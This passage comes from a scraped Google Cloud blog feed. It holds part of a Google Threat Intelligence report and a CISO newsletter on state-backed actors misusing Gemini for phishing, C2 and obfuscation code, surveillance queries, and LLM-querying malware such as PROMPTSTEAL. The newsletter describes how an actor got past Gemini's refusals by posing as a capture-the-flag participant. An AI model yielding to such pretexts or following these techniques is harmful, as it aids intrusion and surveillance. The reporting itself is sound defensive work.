99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">These activities are similar to our findings from January that detailed how bad actors are leveraging Gemini for productivity vs. novel capabilities. We took action against this actor by disabling the assets associated with this actor’s activity and Google DeepMind used these insights to further strengthen our protections against such misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><hr />\n<p><strong><span style=\"vertical-align: baseline;\">Using Deepfakes</span></strong></p>\n<p><span style=\"vertical-align: baseline;\">Beyond UNC1069’s misuse of Gemini, GTIG recently observed the group leverage deepfake images and video lures impersonating individuals in the cryptocurrency industry as part of social engineering campaigns to distribute its BIGMACHO backdoor to victim systems. The campaign prompted targets to download and install a malicious \"Zoom SDK\" link.</span></p>\n<hr /></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"North Korean threat actor’s misuse of Gemini to support their operations\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig7b.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: North Korean threat actor’s misuse of Gemini to support their operations</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">Attempting to Develop Novel Capabilities with AI</span></h5>\n<p><span style=\"vertical-align: baseline;\">UNC4899 (aka PUKCHONG), a North Korean threat actor notable for their use of supply chain compromise, used Gemini for a variety of purposes including developing code, researching exploits, and improving their tooling. The research into vulnerabilities and exploit development likely indicates the group is developing capabilities to target edge devices and modern browsers. We have disabled the threat actor’s accounts. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"UNC4899 misuse of Gemini across the attack lifecycle\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig8a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: UNC4899 (aka PUKCHONG) misuse of Gemini across the attack lifecycle</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 ctd\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-ctd.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Capture-the-Data: Attempts to Develop a “Data Processing Agent”</span></h4>\n<p><span style=\"vertical-align: baseline;\">The use of Gemini by APT42, an Iranian government-backed attacker, </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reflects the group's focus</span></a><span style=\"vertical-align: baseline;\"> on crafting successful phishing campaigns. In recent activity, APT42 used the text generation and editing capabilities of Gemini to craft material for phishing campaigns, often impersonating individuals from reputable organizations such as prominent think tanks and using lures related to security technology, event invitations, or geopolitical discussions. APT42 also used Gemini as a translation tool for articles and messages with specialized vocabulary, for generalized research, and for continued research into Israeli defense. </span></p>\n<p><span style=\"vertical-align: baseline;\">APT42 also attempted to build a “Data Processing Agent”, misusing Gemini to develop and test the tool. The agent converts natural language requests into SQL queries to derive insights from sensitive personal data. The threat actor provided Gemini with schemas for several distinct data types in order to perform complex queries such as linking a phone number to an owner, tracking an individual's travel patterns, or generating lists of people based on shared attributes. We have disabled the threat actors’ accounts.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">These activities are similar to our findings from January that detailed how bad actors are leveraging Gemini for productivity vs. novel capabilities. We took action against this actor by disabling the assets associated with this actor’s activity and Google DeepMind used these insights to further strengthen our protections against such misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"APT42’s misuse of Gemini to support operations\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig9b.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: APT42’s misuse of Gemini to support operations</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Code Development: C2 Development and Support for Obfuscation</span></h4>\n<p><span style=\"vertical-align: baseline;\">Threat actors continue to adapt generative AI tools to augment their ongoing activities, attempting to enhance their tactics, techniques, and procedures (TTPs) to move faster and at higher volume. For skilled actors, generative AI tools provide a helpful framework, similar to the use of Metasploit or Cobalt Strike in cyber threat activity. These tools also afford lower-level threat actors the opportunity to develop sophisticated tooling, quickly integrate existing techniques, and improve the efficacy of their campaigns regardless of technical acumen or language proficiency. </span></p>\n<p><span style=\"vertical-align: baseline;\">Throughout August 2025, GTIG observed threat activity associated with PRC-backed APT41, utilizing Gemini for assistance with code development. The group has demonstrated a history of targeting a range of operating systems across mobile and desktop devices as well as employing social engineering compromises for their operations. Specifically, the group leverages open forums to both lure victims to exploit-hosting infrastructure and to prompt installation of malicious mobile applications.</span></p>\n<p><span style=\"vertical-align: baseline;\">In order to support their campaigns, the actor was seeking out technical support for C++ and Golang code for multiple tools including a C2 framework called OSSTUN by the actor. The group was also observed prompting Gemini for help with code obfuscation, with prompts related to two publicly available obfuscation libraries.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"APT41 misuse of Gemini to support operations\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig10b.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 10: APT41 misuse of Gemini to support operations</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><hr />\n<p><strong>Information Operations and Gemini</strong></p>\n<p><span style=\"vertical-align: baseline;\">GTIG continues to observe IO actors utilize Gemini for research, content creation, and translation, which aligns with their previous use of Gemini to support their malicious activity. We have identified Gemini activity that indicates threat actors are soliciting the tool to help create articles or aid them in building tooling to automate portions of their workflow. However, we have not identified these generated articles in the wild, nor identified evidence confirming the successful automation of their workflows leveraging this newly built tooling. None of these attempts have created breakthrough capabilities for IO campaigns.</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><strong>Mitigations</strong></td>\n</tr>\n<tr>\n<td style=\"width: 98.1839%;\"><span style=\"vertical-align: baseline;\">For observed IO campaigns, we did not see evidence of successful automation or any breakthrough capabilities. These activities are similar to our findings from January that detailed how bad actors are leveraging Gemini for productivity vs. novel capabilities. We took action against this actor by disabling the assets associated with this actor’s activity and Google DeepMind used these insights to further strengthen our protections against such misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Building AI Safely and Responsibly </span></h3>\n<p><span style=\"vertical-align: baseline;\">We believe our approach to AI must be both bold and responsible. That means developing AI in a way that maximizes the positive benefits to society while addressing the challenges. Guided by our </span><a href=\"https://ai.google/responsibility/responsible-ai-practices/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Principles</span></a><span style=\"vertical-align: baseline;\">, Google designs AI systems with robust security measures and strong safety guardrails, and we continuously test the security and safety of our models to improve them. </span></p>\n<p><span style=\"vertical-align: baseline;\">Our </span><a href=\"https://gemini.google/policy-guidelines/?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">policy guidelines</span></a><span style=\"vertical-align: baseline;\"> and prohibited use </span><a href=\"https://policies.google.com/terms/generative-ai/use-policy\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">policies</span></a><span style=\"vertical-align: baseline;\"> prioritize safety and responsible use of Google's generative AI tools. Google's </span><a href=\"https://transparency.google/our-approach/our-policy-process/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">policy development process</span></a><span style=\"vertical-align: baseline;\"> includes identifying emerging trends, thinking end-to-end, and designing for safety. We continuously enhance safeguards in our products to offer scaled protections to users across the globe.  </span></p>\n<p><span style=\"vertical-align: baseline;\">At Google, </span><a href=\"https://cloud.google.com/transform/how-google-does-it-threat-intelligence-uncover-track-cybercrime\"><span style=\"text-decoration: underline; vertical-align: baseline;\">we leverage threat intelligence to disrupt</span></a><span style=\"vertical-align: baseline;\"> adversary operations. We investigate abuse of our products, services, users, and platforms, including malicious cyber activities by government-backed threat actors, and work with law enforcement when appropriate. Moreover, our learnings from countering malicious activities are fed back into our product development to improve safety and security for our AI models. These changes, which can be made to both our classifiers and at the model level, are essential to maintaining agility in our defenses and preventing further misuse.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google DeepMind also develops threat models for generative AI to identify potential vulnerabilities, and creates new evaluation and training techniques to address misuse. In conjunction with this research, Google DeepMind has shared how they're actively deploying defenses in AI systems, along with measurement and monitoring tools, including a robust evaluation framework that can automatically red team an AI vulnerability to indirect prompt injection attacks. </span></p>\n<p><span style=\"vertical-align: baseline;\">Our AI development and Trust &amp; Safety teams also work closely with our threat intelligence, security, and modelling teams to stem misuse.</span></p>\n<p><span style=\"vertical-align: baseline;\">The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly. That's why we introduced the </span><a href=\"https://blog.google/technology/safety-security/introducing-googles-secure-ai-framework/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Secure AI Framework (SAIF)</span></a><span style=\"vertical-align: baseline;\">, a conceptual framework to secure AI systems. We've shared a comprehensive </span><a href=\"https://ai.google.dev/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">toolkit for developers</span></a><span style=\"vertical-align: baseline;\"> with </span><a href=\"https://ai.google.dev/responsible\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">resources and guidance</span></a><span style=\"vertical-align: baseline;\"> for designing, building, and evaluating AI models responsibly. We've also shared best practices for </span><a href=\"https://ai.google.dev/responsible/docs/safeguards\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">implementing safeguards</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://ai.google.dev/responsible/docs/evaluation#red-teaming\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">evaluating model safety</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://blog.google/technology/safety-security/googles-ai-red-team-the-ethical-hackers-making-ai-safer/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">red teaming</span></a><span style=\"vertical-align: baseline;\"> to test and secure AI systems. </span></p>\n<p><span style=\"vertical-align: baseline;\">Google also continuously invests in AI research, helping to ensure </span><a href=\"https://ai.google/static/documents/ai-responsibility-update-published-february-2025.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI is built responsibly</span></a><span style=\"text-decoration: underline; vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">and that we’re leveraging its potential to automatically find risks. Last year, we introduced </span><a href=\"https://blog.google/technology/safety-security/cybersecurity-updates-summer-2025/\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">Big Sleep</span></a><span style=\"vertical-align: baseline;\">, an AI agent developed by Google DeepMind and Google Project Zero, that actively searches and finds unknown security vulnerabilities in software. Big Sleep has since found its first real-world security vulnerability and assisted in finding a vulnerability that was imminently going to be used by threat actors, which GTIG was able to cut off beforehand. We’re also experimenting with AI to not only find vulnerabilities, but also patch them. We recently introduced </span><a href=\"https://deepmind.google/discover/blog/introducing-codemender-an-ai-agent-for-code-security/\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">CodeMender</span></a><span style=\"vertical-align: baseline;\">, an experimental AI-powered agent utilizing the advanced reasoning capabilities of our Gemini models to automatically fix critical code vulnerabilities.</span><span style=\"text-decoration: underline; vertical-align: baseline;\"> </span></p>\n<h3><span style=\"vertical-align: baseline;\">About the Authors</span></h3>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group focuses on identifying, analyzing, mitigating, and eliminating entire classes of cyber threats against Alphabet, our users, and our customers. Our work includes countering threats from government-backed attackers, targeted zero-day exploits, coordinated information operations (IO), and serious cyber crime networks. We apply our intelligence to improve Google's defenses and protect our users and customers. </span></p></div>",
        "published_date": "2025-11-05 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-recent-advances-in-how-threat-actors-use-ai-tools/",
        "title": "Cloud CISO Perspectives: Recent advances in how threat actors use AI tools",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Cloud_CISO_Perspectives_header_4_Blue.max-600x600.png",
        "author": "Sandra Joyce",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Welcome to the first Cloud CISO Perspectives for November 2025. Today, Sandra Joyce, vice-president, Google Threat Intelligence, updates us on the state of the adversarial misuse of AI.</p><p>As with all Cloud CISO Perspectives, the contents of this newsletter are posted to the <a href=\"https://cloud.google.com/blog/products/identity-security/\">Google Cloud blog</a>. If you’re reading this on the website and you’d like to receive the email version, you can <a href=\"https://cloud.google.com/resources/google-cloud-ciso-newsletter-signup\">subscribe here</a>.</p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Get vital board insights with Google Cloud&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe16cf377f0&gt;), (&#x27;btn_text&#x27;, &#x27;Visit the hub&#x27;), (&#x27;href&#x27;, &#x27;https://cloud.google.com/solutions/security/board-of-directors?utm_source=cloud_sfdc&amp;utm_medium=email&amp;utm_campaign=FY24-Q2-global-PROD941-physicalevent-er-CEG_Boardroom_Summit&amp;utm_content=-&amp;utm_term=-&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3>Recent advances in how threat actors use AI tools</h3><p><i>By Sandra Joyce, vice-president, Google Threat Intelligence</i></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"Sandra Joyce\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2022_S_Joyce_Headshot.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Sandra Joyce, vice-president, Google Threat Intelligence</p></figcaption>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p>As defenders have made significant advances in using AI to boost their efforts this year, government-backed threat actors and cybercriminals have been trying to do the same. Google Threat Intelligence Group (GTIG) has observed threat actors moving beyond using AI solely for productivity gains: They’re experimenting with <b>deploying novel AI-enabled malware in active operations</b>.</p><p>This shift marks a new phase in how threat actors use AI, shifting from experimentation to wider takeup of tools. It follows our analysis on the <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai\">adversarial misuse of generative AI</a>, where we found that, up until the point when we published the report in January, threat actors were using Gemini mostly for productivity gains.</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-pull_quote\"><div class=\"uni-pull-quote h-c-page\">\n  <section class=\"h-c-grid\">\n    <div class=\"uni-pull-quote__wrapper h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n      <div class=\"uni-pull-quote__inner-wrapper h-c-copy h-c-copy\">\n        <q class=\"uni-pull-quote__text\">At Google, we are committed to developing AI responsibly and are taking proactive steps to disrupt malicious activity, disabling the projects and accounts associated with these threat actors.</q>\n\n        \n      </div>\n    </div>\n  </section>\n</div>\n\n</div>\n<div class=\"block-paragraph\"><p>Based on GTIG’s unique visibility into the misuse of AI tools and the broader threat landscape, the new report details four key findings on how government-backed threat actors and cybercriminals are integrating AI across their entire attack lifecycle. By understanding how adversaries are innovating with AI, security leaders can get ahead of threats and take proactive measures to update their security posture against a changing threat landscape.</p><p><b>1. AI generating commands to steal documents and data</b></p><p>For the first time, GTIG has identified malware families that use large language models (LLMs) during execution. These tools can dynamically generate malicious scripts, use self-modification to obfuscate their own code to evade detection, and receive commands from AI models rather than traditional command-and-control (C2) servers.</p><p>One such new malware detailed in the full report is a data miner we track as PROMPTSTEAL. In June, GTIG identified the Russian government-backed actor APT28 (also known as FROZENLAKE) using PROMPTSTEAL, which masquerades as an image generation program that guides the user through a series of prompts to generate images.</p><p>In the background, PROMPSTEAL queries the API for Hugging Face, a platform for open-source machine learning including LLMs, to generate commands for execution, rather than hard-coding commands in the malware. The prompt specifically asks the LLM to output commands to gather system information, to copy documents to a specified directory, and to exfiltrate data.</p><p>Our analysis indicates continued development of this malware, with new samples adding obfuscation and changing the C2 method.</p><p>FROZENLAKE’s use of PROMPTSTEAL constitutes <b>our first observation of malware querying a LLM deployed in live operations</b>. Combined with other recent experimental implementations of novel AI techniques, this campaign provides an early indicator of how threats are evolving and how adversaries can potentially integrate AI capabilities into future intrusion activity.</p></div>\n<div class=\"block-paragraph\"><p><b>What Google is doing</b>: Google has taken action against this actor by disabling the assets associated with their activity. Google DeepMind has also used these insights to further strengthen our protections against misuse by strengthening both Google’s classifiers and the model itself. This enables the model to refuse to assist with these types of attacks moving forward.</p><p><b>2. Social engineering to bypass safeguards</b></p><p>Threat actors have been adopting social engineering pretexts in their prompts to bypass AI safeguards. We observed actors posing as cybersecurity researchers and as students in capture-the-flag (CTF) competitions to persuade Gemini to provide information that would otherwise receive a safety response from Gemini.</p><p>In one interaction, a threat actor asked Gemini to identify vulnerabilities on a compromised system, but received a safety response from Gemini that a detailed response would not be safe. They reframed the prompt by depicting themselves as a participant in a CTF exercise, and in response Gemini returned helpful information that could be misused to exploit the system.</p><p>The threat actor appeared to learn from this interaction and continued to use the CTF pretext over several weeks in support of phishing, exploitation, and webshell development.</p><p><b>What Google is doing</b>: We took action against the CTF threat actor by disabling the assets associated with the actor’s activity. Google DeepMind was able to use these insights to further strengthen our protections against misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</p><p><b>3. Maturing cybercrime marketplace for AI tooling</b></p><p>In addition to misusing mainstream AI-enabled tools and services, there is a growing interest and marketplace for purpose-built AI tools and services that can enable illicit activities. To identify evolving threats, GTIG tracks posts and advertisements on underground forums related to AI tools and services as well as discussions surrounding the technology.</p><p>Many underground forum advertisements mirror language comparable to marketing for legitimate AI models, citing the need to improve the efficiency of workflows and effort while simultaneously offering guidance for prospective customers interested in their offerings.</p><p>The underground marketplace for illicit AI tools has matured in 2025. GTIG has <a href=\"https://www.buzzsprout.com/1762840/episodes/17689432-ai-tools-and-sentiment-within-the-underground-cyber-crime-community\" target=\"_blank\">identified multiple offerings</a> of multifunctional tools designed to support phishing, malware development, vulnerability research, and other capabilities. This development has lowered the barrier to entry for less sophisticated, poorly-resourced threat actors.</p><p><b>What Google is doing</b>: While there are no direct mitigations to prevent threat actors from developing their own AI tools, at Google we <a href=\"https://cloud.google.com/transform/how-google-does-it-threat-intelligence-uncover-track-cybercrime?e=48754805\">use threat intelligence to disrupt adversary operations</a> — including monitoring the cybercrime AI tool marketplace.</p><p><b>4. Continued augmentation of the full attack lifecycle</b></p><p>State-sponsored actors from North Korea, Iran, and the People's Republic of China (PRC) continue to misuse AI to enhance all stages of their operations, from reconnaissance and phishing lure creation to C2 development and data exfiltration.</p><p>In one example, GTIG observed a suspected PRC-nexus actor using Gemini to support multiple stages of an intrusion campaign, including conducting initial reconnaissance on targets, researching phishing techniques to deliver payloads, soliciting assistance from Gemini related to lateral movement, seeking technical support for C2 efforts once inside a victim’s system, and helping with data exfiltration.</p><p><b>What Google is doing</b>: GTIG takes a holistic, intelligence-driven approach to detecting and disrupting threat activity. Our understanding of government-backed threat actors and their campaigns can help provide the needed context to identify threat-enabling activity. By tracking this activity, we’re able to leverage our insights to counter threats across Google platforms, including disrupting the activity of threat actors who have misused Gemini.</p><p>Our learnings from countering malicious activities are fed back into our product development to improve safety and security for our AI models. Google DeepMind was able to use these insights to further strengthen our protections against misuse. Observations have been used to strengthen both classifiers and the model itself, enabling it to refuse to assist with these types of attacks moving forward.</p><p><b>Building AI safely and responsibly</b></p><p>At Google, we are committed to developing AI responsibly and are taking proactive steps to disrupt malicious activity, disabling the projects and accounts associated with these threat actors. In addition to taking action against accounts, we have proactively fed the intelligence back into our teams and products to better protect Google and its users. We continuously improve our models to make them less susceptible to misuse, and share our findings to arm defenders and enable stronger protections across the ecosystem.</p><p>We believe our approach to AI must be both bold and responsible. That means developing AI in a way that maximizes the positive benefits to society while addressing the challenges. Guided by our <a href=\"https://ai.google/responsibility/responsible-ai-practices/\" target=\"_blank\">AI Principles</a>, Google designs AI systems with robust security measures and strong safety guardrails, and we <a href=\"https://deepmind.google/discover/blog/advancing-geminis-security-safeguards/\" target=\"_blank\">continuously test</a> the security and safety of our models to improve them.</p><p>For more on these shifting behaviors, along with the steps we’ve taken to thwart these efforts, you can read <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools\">GTIG AI Threat Tracker: Advances in Threat Actor Usage of AI Tools here</a>.</p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Tell us what you think&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe16cf37340&gt;), (&#x27;btn_text&#x27;, &#x27;Join the conversation&#x27;), (&#x27;href&#x27;, &#x27;https://google.qualtrics.com/jfe/form/SV_2n82k0LeG4upS2q&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3><b>In case you missed it</b></h3><p>Here are the latest updates, products, services, and resources from our security teams so far this month:</p><ul><li><b>How Google Does It: Threat modeling, from basics to AI</b>: Threat modeling plays a critical role at Google in how we detect and respond to threats — and secure our use of the public cloud. <a href=\"https://cloud.google.com/transform/how-google-does-it-threat-modeling-from-basics-to-ai/\"><b>Read more</b></a>.</li><li><b>How rapid threat models inject more reality into tabletops</b>: Using rapid threat models in tabletop exercises can help you better understand how defense should adapt to the dynamic threat environment. <a href=\"https://cloud.google.com/transform/how-rapid-threat-models-inject-more-reality-into-tabletops/\"><b>Read more</b></a>.</li><li><b>How we're helping customers prepare for a quantum-safe future</b>: Google has been working on quantum-safe computing for nearly a decade. Here’s our latest on protecting data in transit, digital signatures, and public key infrastructure. <a href=\"https://cloud.google.com/blog/products/identity-security/how-were-helping-customers-prepare-for-a-quantum-safe-future\"><b>Read more</b></a>.</li><li><b>HTTPS by default coming to Chrome</b>: One year from now, with the release of Chrome 154 in October 2026, we will change the default settings of Chrome to enable “Always Use Secure Connections”. This means Chrome will ask for the user's permission before the first access to any public site without HTTPS. <a href=\"https://security.googleblog.com/2025/10/https-by-default.html\" target=\"_blank\"><b>Read more</b></a>.</li><li><b>How AI helps Android keep you safe from mobile scams</b>: For years, Android has been on the frontlines in the battle against scammers, using the best of Google AI to build proactive, layered protections that can anticipate and block scams before they reach you. <a href=\"https://security.googleblog.com/2025/10/how-android-protects-you-from-scams.html\" target=\"_blank\"><b>Read more</b></a>.</li></ul><p>Please visit the Google Cloud blog for more security stories <a href=\"https://cloud.google.com/blog/products/identity-security\">published this month</a>.</p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Join the Google Cloud CISO Community&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe16cf37fd0&gt;), (&#x27;btn_text&#x27;, &#x27;Learn more&#x27;), (&#x27;href&#x27;, &#x27;https://rsvp.withgoogle.com/events/ciso-community-interest?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=2024-cloud-ciso-newsletter-events-ref&amp;utm_content=-&amp;utm_term=-&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3><b>Threat Intelligence news</b></h3><ul><li><b>A defender's guide to privileged account monitoring</b>: Privileged access stands as the most critical pathway for adversaries seeking to compromise sensitive systems and data. This guide can help you protect the proverbial keys to your kingdom with recommendations and insights to prevent, detect, and respond to intrusions targeting privileged accounts. <a 